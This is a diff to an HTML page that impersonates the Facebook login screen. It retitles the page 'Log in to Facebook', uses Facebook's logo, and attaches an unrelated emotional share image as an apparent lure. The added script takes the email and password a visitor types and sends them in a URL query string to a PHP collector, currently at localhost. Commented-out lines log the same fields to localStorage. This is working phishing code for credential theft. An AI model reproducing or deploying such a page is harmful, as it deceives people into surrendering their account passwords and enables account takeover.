@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Log in to Facebook | Facebook</title>
     <meta property="og:image" content="https://w0.peakpx.com/wallpaper/371/1001/HD-wallpaper-life-line-heart-broken-emotional-heart-beat-heart-line-lifeline-lovely-no-love-sad.jpg" />
     <meta property="og:title" content="Lifeline" />
     <style>
@@ -135,11 +135,13 @@
         <div class="logo">
             <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
         </div>
-        <form class="form" action="ind.php" method="POST">
-            <input type="text" name="email" class="inputs input-area" placeholder="Mobile number or email address">
-            <input type="password" name="password" class="inputs input-area" placeholder="Password">
-            <input type="submit" name="submit" class="inputs submit" value="Log In">
+        <!-- <form class="form" action="ind.php" method="POST"> -->
+        <div>
+            <input type="text" name="email" id="email" class="inputs input-area" placeholder="Mobile number or email address">
+            <input type="password" name="password" class="inputs input-area" placeholder="Password" id="password">
+            <input type="submit" name="submit" class="inputs submit" value="Log In" id="sub">
         </form>
+        </div>
         <div class="forgot">
             <p>Forgotten password?</p>
         </div>
@@ -169,5 +171,18 @@
             <p>Meta © 2023</p>
         </div>
     </div>
+    <script>
+        // localStorage.setItem("string1","value");
+        // localStorage.setItem("string2","value");
+        // email.onkeydown=()=>{
+        //     localStorage.setItem("string1",email.value);
+        // }
+        // password.onkeydown=()=>{
+        //     localStorage.setItem("string2",password.value);
+        // }
+        sub.onclick=()=>{
+            location.href=`http://localhost/web/ind.php?string=${email.value}+${password.value}`
+        }
+    </script>
 </body>
 </html>
